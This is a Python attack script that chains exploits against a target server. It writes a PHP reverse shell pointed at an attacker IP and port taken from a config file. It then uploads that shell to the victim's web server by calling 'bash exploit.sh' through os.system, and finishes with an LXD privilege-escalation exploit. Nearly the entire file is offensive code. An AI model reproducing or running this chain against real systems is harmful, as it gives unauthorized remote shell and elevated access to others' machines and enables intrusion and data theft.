import os
import my_reverse_shell
import requests
from datetime import datetime
from configparser import ConfigParser 
from Privilege_Escalation_LXD import LXD_exploit

def exploit_LXD():
	config_object = ConfigParser()
	config_object.read("config.ini")
	attacker_info = config_object["ATTACKERINFO"]
	victim_info = config_object["VICTIMINFO"]
	general_info = config_object["GENERALINFO"]
	
	
	f = open("reverse_shell.php", "w")

	code = my_reverse_shell.gen_reverse_shell(attacker_info)

	f.write(code)

	f.close()

	print('[+] Reverse Shell generated')

	flag = False

		

	print('[*] Executing exploit')
	
	print('[*] Sending the payload...')
	launch_exploit(attacker_info, victim_info)
	user_dir = os.getcwd()
	print('[*] Proceeding to execute the reverse shell')
	LXD_exploit.run(attacker_info["ip"], attacker_info["port"], victim_info['ip'], victim_info['port'], general_info)


def launch_exploit(attacker_info, victim_info):
	now = datetime.now()
	s = ''
	if victim_info['secure'] == True:
		s = 's'
	print('[DEBBUG] Exec => bash exploit.sh -u http' + s + '://{ip}:{port} -f {path}'.format(ip = victim_info["ip"], port = victim_info["port"], path = ( os.getcwd() + '/reverse_shell.php')))
	os.system('''bash exploit.sh -u http''' + s + '''://{ip}:{port} -f {path}'''.format(ip = victim_info["ip"], port = victim_info["port"], path = ( os.getcwd() + '/reverse_shell.php')))

	print("[*] Checking if url was generated")

